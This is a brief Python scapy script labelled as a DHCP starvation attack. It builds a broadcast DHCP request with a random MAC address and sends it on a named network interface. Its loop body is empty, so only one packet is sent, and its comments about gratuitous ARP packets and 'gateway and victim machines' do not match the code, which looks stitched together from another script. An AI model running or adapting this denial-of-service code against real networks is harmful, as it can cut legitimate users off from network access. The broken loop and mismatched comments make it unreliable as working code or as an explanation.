#!/usr/bin/python
"""
  DHCP starvation attack
"""

import sys
import time
from scapy.all import *

N = 110

for n in range(N):
  pass

# make the ARP gratuitous packets
dhcp_request = Ether(src=RandMAC(), dst='ff:ff:ff:ff:ff:ff')/\
                  IP(src='0.0.0.0', dst='255.255.255.255')/\
                  UDP(sport=68, dport=67)/\
                  BOOTP(chaddr=RandString(12, '0123456789abcdef'))/\
                  DHCP(options=[('message-type','request'),'end'])

# send the two packets for gateway and victim machines
sendp(dhcp_request, iface='p7p1')

